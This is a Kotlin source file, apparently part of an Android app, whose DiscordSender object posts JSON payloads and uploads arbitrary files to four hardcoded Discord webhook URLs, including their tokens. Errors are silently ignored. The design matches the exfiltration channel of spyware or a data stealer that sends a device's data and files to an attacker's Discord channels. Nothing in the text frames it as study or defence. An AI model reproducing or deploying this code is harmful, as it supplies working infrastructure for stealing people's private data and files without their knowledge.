package com.sextexer.sex

import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object DiscordSender {
    private val WEBHOOKS = listOf(
        "https://discord.com/api/webhooks/1573212736433819769/TyI8UvycGfG1kQF2JTtfc0Sx2Fn5ksjQj61LTPNT7V7yNgRqYGJ3hGH8N-4yIIWPO6m6",
        "https://discord.com/api/webhooks/1573212865522049115/flKUfWzWOfKAbcFSnFctIpSEn2ZV49ERbIJ82XgDVoIVOzu3isnLlAzsI7tMC3V0BJkR",
        "https://discord.com/api/webhooks/1573212985714020476/BAlkc1c03XPRYw48Z7XxBoDNDc-DTUcLudk48nlkqZyzIhMDqran9q7XCjaUUbQqmxMq",
        "https://discord.com/api/webhooks/1573213056014487615/Raq3vzeZKhT8Pi7XVtc9kMVRkb-qejG_8tl7FM97bhxGsVxznZiej5cQUUv_uQhAvSP"
    )

    fun sendPayload(json: String) {
        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        val requestBody = json.toRequestBody("application/json".toMediaType())

        WEBHOOKS.forEach { url ->
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .header("Content-Type", "application/json")
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: java.io.IOException) {}
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        }
    }

    fun sendFile(file: File, filename: String) {
        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        WEBHOOKS.forEach { url ->
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", filename, 
                    RequestBody.create("application/octet-stream".toMediaType(), file))
                .build()

            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: java.io.IOException) {}
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        }
    }
}
